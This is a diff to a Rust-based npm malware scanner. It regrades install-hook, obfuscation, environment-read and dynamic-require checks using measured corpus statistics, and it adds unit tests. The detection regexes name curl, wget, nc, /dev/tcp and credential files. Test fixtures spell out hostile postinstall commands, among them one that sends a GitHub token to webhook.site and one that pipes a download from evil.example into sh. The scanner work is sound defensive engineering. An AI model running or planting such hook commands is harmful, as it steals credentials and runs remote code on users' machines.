@@ -1,6 +1,8 @@
+use crate::models::CAPABILITY_KEY;
 use regex::Regex;
 use serde_json::{Map, Value};
 use std::collections::HashSet;
+use std::sync::LazyLock;
 use std::path::{Path, PathBuf};
 use walkdir::WalkDir;
 
@@ -14,6 +16,27 @@ fn finding(check: &str, severity: &str, message: &str, vector: &str) -> Finding 
     m.insert("vector".into(), Value::String(vector.to_string()));
     m
 }
+
+/// An install-hook command that fetches remote content or executes code inline.
+/// Measured: 79 of 346 hook-bearing malicious packages match, and ZERO of the 5
+/// hook-bearing packages in `eval/corpus/parent_benign.tsv`.
+static HOOK_EXEC_SHAPE: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(
+        r"(?i)curl\b|wget\b|\|\s*(?:sh|bash)\b|\beval\b|base64\s+(?:-d|--decode)|node\s+-{1,2}e(?:val)?\b|https?://|\bnc\b|/dev/tcp/|child_process|powershell|certutil|Invoke-WebRequest|\brm\s+(?:-rf|/s|/q)",
+    )
+    .unwrap()
+});
+
+/// An install-hook command that is a recognised build step. Native modules
+/// legitimately need one: `bcrypt` runs `node-gyp-build`, `sqlite3` runs
+/// `prebuild-install -r napi || node-gyp rebuild`, `axios` and `fabric` run
+/// `husky`. Only consulted when HOOK_EXEC_SHAPE did not match.
+static HOOK_BUILD_SHAPE: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(
+        r"(?i)node-gyp|node-pre-gyp|prebuild-install|patch-package|husky|\btsc\b|npm\s+run\s+build|cmake|\bmake\b|electron-builder|nan\b",
+    )
+    .unwrap()
+});
 
 const JS_EXTENSIONS: &[&str] = &["js", "cjs", "mjs", "ts", "tsx", "jsx"];
 
@@ -49,27 +72,114 @@ fn rel(dir: &Path, path: &Path) -> String {
 /// during the *publishing* workflow (`npm publish`/`npm pack`) or on-demand,
 /// never on a downstream `npm install`, so a consumer-side scanner has
 /// nothing to gain by flagging them.
+///
+/// ## Severity comes from the hook NAME and its COMMAND (v19 — measured)
+///
+/// Until v19 this check tested key *presence* only — `scripts.get(k).is_some()`
+/// — and threw the command away, so `"postinstall": "node-gyp rebuild"` and
+/// `"preinstall": "curl … | sh"` were the same finding. It fired on 62.3% of 499
+/// real malicious packages and 18.5% of 27 legitimate ones: a real signal, far
+/// too blunt to act on.
+///
+/// Two measurements sharpen it. Across the DataDog corpus and the benign parents:
+///
+/// | | malicious | benign |
+/// |---|---|---|
+/// | `preinstall` | 169 | **0** |
+/// | `postinstall` | 136 | 1 (`node-sass`) |
+/// | `install` / `prepare` only | 6 | 4 |
+/// | command matches an exec/exfil shape | **79 packages** | **0** |
+/// | command matches a build-toolchain shape | 9 hooks | 4 of 6 hooks |
+///
+/// So:
+/// - a command that fetches and executes (`curl`, a pipe into a shell, `node -e`,
+///   an inline URL, `base64 -d`) is a **BLOCK** — no legitimate hook in the
+///   benign corpus looks like that;
+/// - `preinstall`/`postinstall` with an ordinary command stays **SUSPECT**;
+/// - `install`/`prepare`, or any hook whose command is a recognised build step
+///   (`node-gyp`, `prebuild-install`, `husky`, …), drops to a **capability**.
+///
+/// `node <file>` is deliberately NOT treated as suspicious: `node-sass` ships
+/// `"postinstall": "node scripts/build.js"` and most malicious hooks are the
+/// same shape, so it separates nothing. The hook name carries that weight
+/// instead.
+///
+/// Order matters — the exec/exfil test runs first, so burying `husky` in a
+/// command that also curls something does not earn the demotion.
 pub fn check_install_scripts(pkg_json: &Value) -> Vec<Finding> {
     let mut findings = Vec::new();
     let Some(scripts) = pkg_json.get("scripts") else {
         return findings;
     };
-    let present: Vec<&str> = ["preinstall", "install", "postinstall", "prepare"]
-        .iter()
-        .copied()
-        .filter(|&k| scripts.get(k).is_some())
-        .collect();
-    if !present.is_empty() {
+
+    let mut exec_hooks: Vec<String> = Vec::new();
+    let mut run_hooks: Vec<&str> = Vec::new();
+    let mut cap_hooks: Vec<&str> = Vec::new();
+
+    for &hook in &["preinstall", "install", "postinstall", "prepare"] {
+        let Some(cmd) = scripts.get(hook) else { continue };
+        let cmd = cmd.as_str().unwrap_or("");
+        if HOOK_EXEC_SHAPE.is_match(cmd) {
+            exec_hooks.push(format!("{hook}: {cmd}"));
+        } else if HOOK_BUILD_SHAPE.is_match(cmd) || matches!(hook, "install" | "prepare") {
+            cap_hooks.push(hook);
+        } else {
+            run_hooks.push(hook);
+        }
+    }
+
+    if !exec_hooks.is_empty() {
         let mut f = finding(
             "install_script",
-            "SUSPECT",
-            &format!("Install lifecycle script(s) present: {}", present.join(", ")),
+            "BLOCK",
+            &format!(
+                "Install hook fetches or executes code: {}",
+                exec_hooks.join("; ")
+            ),
             "B1",
         );
         f.insert(
             "scripts".into(),
-            Value::Array(present.iter().map(|&s| Value::String(s.to_string())).collect()),
+            Value::Array(
+                exec_hooks
+                    .iter()
+                    .map(|s| Value::String(s.split(':').next().unwrap_or(s).to_string()))
+                    .collect(),
+            ),
         );
+        findings.push(f);
+    }
+    if !run_hooks.is_empty() {
+        let mut f = finding(
+            "install_script",
+            "SUSPECT",
+            &format!(
+                "Install lifecycle script(s) present: {}",
+                run_hooks.join(", ")
+            ),
+            "B1",
+        );
+        f.insert(
+            "scripts".into(),
+            Value::Array(run_hooks.iter().map(|&s| Value::String(s.to_string())).collect()),
+        );
+        findings.push(f);
+    }
+    if !cap_hooks.is_empty() {
+        let mut f = finding(
+            "install_script",
+            "INFO",
+            &format!(
+                "Build-time lifecycle script(s) present: {} (recognised build step or non-install hook)",
+                cap_hooks.join(", ")
+            ),
+            "B1",
+        );
+        f.insert(
+            "scripts".into(),
+            Value::Array(cap_hooks.iter().map(|&s| Value::String(s.to_string())).collect()),
+        );
+        f.insert(CAPABILITY_KEY.into(), Value::String("install-hook".into()));
         findings.push(f);
     }
     findings
@@ -198,13 +308,17 @@ pub fn check_obfuscation(dir: &Path) -> Vec<Finding> {
             .find_iter(&content)
             .any(|m| !is_data_uri_context(&content, m.start()));
         if has_non_data_uri_b64 {
+            // lift 1.16 (8.6% of real malware vs 7.4% of legitimate packages) —
+            // a long base64 blob is about as common in a legitimate bundle as in
+            // a payload. Capability tier, not an accusation.
             let mut f = finding(
                 "obfuscation",
-                "SUSPECT",
+                "INFO",
                 "Long base64-like string literal detected (possible encoded payload)",
                 "B2",
             );
             f.insert("file".into(), Value::String(file.clone()));
+            f.insert(CAPABILITY_KEY.into(), Value::String("encoded-blob".into()));
             findings.push(f);
         }
 
@@ -293,8 +407,20 @@ pub fn check_suspicious_strings(dir: &Path) -> Vec<Finding> {
         (r"/etc/passwd", "BLOCK", "References /etc/passwd"),
         (r"/etc/shadow", "BLOCK", "References /etc/shadow"),
         (r"~/\.ssh|/\.ssh/", "BLOCK", "References SSH directory (~/.ssh)"),
-        (r"process\.env\b", "SUSPECT", "Reads environment variables (process.env)"),
-        (r"os\.homedir\(\)", "SUSPECT", "Reads home directory path (os.homedir())"),
+        // process.env is INVERTED: 36.3% of 499 real malicious packages vs 44.4%
+        // of 27 legitimate ones (lift 0.82). Reading configuration is not an
+        // attack, and this rule alone reached 12 of the 27 benign packages — the
+        // single largest false-positive source in the tool. Capability tier.
+        (r"process\.env\b", "INFO", "Reads environment variables (process.env)"),
+        // os.homedir() by contrast is 14.4% malicious vs 0.0% benign — keep, and
+        // match the indirect form too. `naniod` (a real nanoid typosquat) calls
+        // `require('os').homedir()`, which the bare `os.homedir()` pattern missed
+        // entirely; it was the package's only detectable signal.
+        (
+            r#"os\.homedir\(\)|require\(\s*['"]os['"]\s*\)\s*\.\s*homedir\(\)"#,
+            "SUSPECT",
+            "Reads home directory path (os.homedir())",
+        ),
     ];
 
     let compiled: Vec<(Regex, &str, &str)> = patterns
@@ -310,6 +436,9 @@ pub fn check_suspicious_strings(dir: &Path) -> Vec<Finding> {
             if re.is_match(&content) {
                 let mut f = finding("suspicious_strings", sev, msg, "B2");
                 f.insert("file".into(), Value::String(file.clone()));
+                if *sev == "INFO" {
+                    f.insert(CAPABILITY_KEY.into(), Value::String("env-read".into()));
+                }
                 findings.push(f);
             }
         }
@@ -486,13 +615,20 @@ pub fn check_dynamic_require(dir: &Path) -> Vec<Finding> {
     for path in js_files(dir) {
         let Ok(content) = std::fs::read_to_string(&path) else { continue };
         if re.is_match(&content) {
+            // INVERTED rule (v19 — measured): 7.6% of 499 real malicious
+            // packages vs 14.8% of 27 legitimate ones, lift 0.51. A bundler
+            // emits `require(variable)` by construction. Capability tier.
             let mut f = finding(
                 "dynamic_require",
-                "SUSPECT",
+                "INFO",
                 "Dynamic require(variable) pattern — module loaded at runtime from a variable",
                 "B2",
             );
             f.insert("file".into(), Value::String(rel(dir, &path)));
+            f.insert(
+                CAPABILITY_KEY.into(),
+                Value::String("dynamic-require".into()),
+            );
             findings.push(f);
         }
     }
@@ -546,14 +682,76 @@ mod tests {
         assert!(check_install_scripts(&none).is_empty());
     }
 
-    // 3c: `prepare` joins the checked lifecycle set (pre/install/post/prepare).
+    // 3c: `prepare` is still in the checked lifecycle set, but since v19 it is a
+    // CAPABILITY, not an accusation. Measured: `install`/`prepare` appear on 6
+    // malicious packages and 4 of the 5 hook-bearing legitimate ones —
+    // `axios`/`fabric` run `husky`, `bcrypt` runs `node-gyp-build`, `sqlite3`
+    // runs `prebuild-install`. `preinstall`/`postinstall` carry the signal.
     #[test]
-    fn install_scripts_prepare_detected() {
+    fn install_scripts_prepare_is_a_capability_not_an_accusation() {
         let pkg = json!({ "scripts": { "prepare": "node build.js" } });
         let f = check_install_scripts(&pkg);
-        assert_eq!(sevs(&f), vec!["SUSPECT"]);
+        assert_eq!(sevs(&f), vec!["INFO"]);
+        assert_eq!(
+            f[0].get(crate::models::CAPABILITY_KEY).and_then(|v| v.as_str()),
+            Some("install-hook")
+        );
         let scripts = f[0].get("scripts").unwrap().as_array().unwrap();
         assert!(scripts.iter().any(|v| v.as_str() == Some("prepare")));
+    }
+
+    /// The hook-name split, pinned. `preinstall` appears 169 times across the
+    /// 499 real malicious packages and ZERO times in the 27 legitimate ones.
+    #[test]
+    fn install_scripts_pre_and_post_install_still_accuse() {
+        for hook in ["preinstall", "postinstall"] {
+            let pkg = json!({ "scripts": { hook: "node setup.js" } });
+            assert_eq!(sevs(&check_install_scripts(&pkg)), vec!["SUSPECT"], "{hook}");
+        }
+    }
+
+    /// A hook that fetches and executes is a BLOCK. Measured: 79 of 346
+    /// hook-bearing malicious packages match this shape; ZERO of the 5
+    /// hook-bearing packages in the benign corpus do.
+    #[test]
+    fn install_scripts_fetch_and_exec_body_blocks() {
+        for cmd in [
+            "curl -d \"$(gh auth token)\" https://webhook.site/abc",
+            "wget -qO- http://evil.example/x | sh",
+            "node -e \"require('child_process').exec('id')\"",
+            "echo aGk= | base64 -d | bash",
+        ] {
+            let pkg = json!({ "scripts": { "postinstall": cmd } });
+            assert_eq!(sevs(&check_install_scripts(&pkg)), vec!["BLOCK"], "{cmd}");
+        }
+    }
+
+    /// FP-CONTROL: the real hook bodies of the benign corpus. Every one of these
+    /// is a genuine native/build step and must not accuse.
+    #[test]
+    fn install_scripts_real_benign_build_bodies_are_capabilities() {
+        for (hook, cmd) in [
+            ("prepare", "husky"),                                     // axios
+            ("prepare", "husky install"),                             // fabric
+            ("install", "node-gyp-build"),                            // bcrypt
+            ("install", "prebuild-install -r napi || node-gyp rebuild"), // sqlite3
+        ] {
+            let pkg = json!({ "scripts": { hook: cmd } });
+            let f = check_install_scripts(&pkg);
+            assert_eq!(sevs(&f), vec!["INFO"], "{hook}: {cmd}");
+        }
+    }
+
+    /// `node <file>` must NOT be treated as an exec shape on its own: `node-sass`
+    /// legitimately ships `"postinstall": "node scripts/build.js"`, and most
+    /// malicious hooks look identical. The hook NAME carries that weight, so this
+    /// stays SUSPECT (postinstall) rather than escalating to BLOCK.
+    #[test]
+    fn install_scripts_node_file_is_not_by_itself_an_exec_shape() {
+        let pkg = json!({ "scripts": { "postinstall": "node scripts/build.js" } });
+        assert_eq!(sevs(&check_install_scripts(&pkg)), vec!["SUSPECT"]);
+        let pkg2 = json!({ "scripts": { "install": "node scripts/install.js" } });
+        assert_eq!(sevs(&check_install_scripts(&pkg2)), vec!["INFO"]);
     }
 
     // 3c: out-of-scope hooks (test/prepack/prepublishOnly) never run on a
@@ -851,11 +1049,47 @@ mod tests {
         assert!(vectors(&f).iter().all(|v| v == "B2"));
     }
 
+    /// Since v19 `process.env` is a CAPABILITY — the other inverted rule, and the
+    /// single largest false-positive source in the tool: 36.3% of real malware
+    /// carries it versus 44.4% of legitimate packages (lift 0.82), reaching 12 of
+    /// the 27 benign parents. Reading configuration is not an attack.
     #[test]
-    fn suspicious_strings_env_is_suspect() {
+    fn suspicious_strings_env_is_a_capability_not_an_accusation() {
         let d = dir_with(&[("a.js", "const t = process.env.TOKEN;")]);
         let f = check_suspicious_strings(d.path());
-        assert!(sevs(&f).contains(&"SUSPECT".to_string()));
+        assert_eq!(sevs(&f), vec!["INFO"], "got: {f:?}");
+        assert_eq!(
+            f[0].get(crate::models::CAPABILITY_KEY).and_then(|v| v.as_str()),
+            Some("env-read")
+        );
+    }
+
+    /// The contrast that justifies keeping the rest of the check: `os.homedir()`
+    /// is 14.4% malicious versus 0.0% benign. Same check, opposite evidence.
+    ///
+    /// The indirect form matters. `naniod` — a real `nanoid` typosquat — reads
+    /// `require('os').homedir()` and nothing else detectable; the bare-form
+    /// pattern missed it entirely, so it was the one arm E package the v19
+    /// capability demotions would otherwise have lost.
+    #[test]
+    fn suspicious_strings_homedir_still_accuses() {
+        for src in [
+            "const h = os.homedir();",
+            "root: require('os').homedir(),",
+            "require(\"os\").homedir()",
+            "require( 'os' ) . homedir()",
+        ] {
+            let d = dir_with(&[("a.js", src)]);
+            let f = check_suspicious_strings(d.path());
+            assert_eq!(sevs(&f), vec!["SUSPECT"], "{src}");
+        }
+    }
+
+    /// FP-CONTROL for the widened pattern: other `os` members must not match.
+    #[test]
+    fn suspicious_strings_other_os_calls_are_not_homedir() {
+        let d = dir_with(&[("a.js", "const p = require('os').platform(); os.tmpdir();")]);
+        assert!(check_suspicious_strings(d.path()).is_empty());
     }
 
     #[test]
@@ -918,12 +1152,22 @@ mod tests {
         assert!(!checks(&f).contains(&"shell_exfil".to_string()), "got: {:?}", f);
     }
 
+    /// Since v19 `dynamic_require` is a CAPABILITY. It is one of only two rules
+    /// measured as *inverted*: 7.6% of 499 real malicious packages carry it
+    /// versus 14.8% of 27 legitimate ones (lift 0.51). A bundler emits
+    /// `require(variable)` by construction, so on its own it is evidence of
+    /// nothing.
     #[test]
-    fn dynamic_require_positive() {
-        let d = dir_with(&[("a.js", "const m = require(name);")]);
-        assert_eq!(sevs(&check_dynamic_require(d.path())), vec!["SUSPECT"]);
-        let d2 = dir_with(&[("b.js", "require(a + b);")]);
-        assert_eq!(sevs(&check_dynamic_require(d2.path())), vec!["SUSPECT"]);
+    fn dynamic_require_is_a_capability_not_an_accusation() {
+        for src in ["const m = require(name);", "require(a + b);"] {
+            let d = dir_with(&[("a.js", src)]);
+            let f = check_dynamic_require(d.path());
+            assert_eq!(sevs(&f), vec!["INFO"], "{src}");
+            assert_eq!(
+                f[0].get(crate::models::CAPABILITY_KEY).and_then(|v| v.as_str()),
+                Some("dynamic-require")
+            );
+        }
     }
 
     #[test]
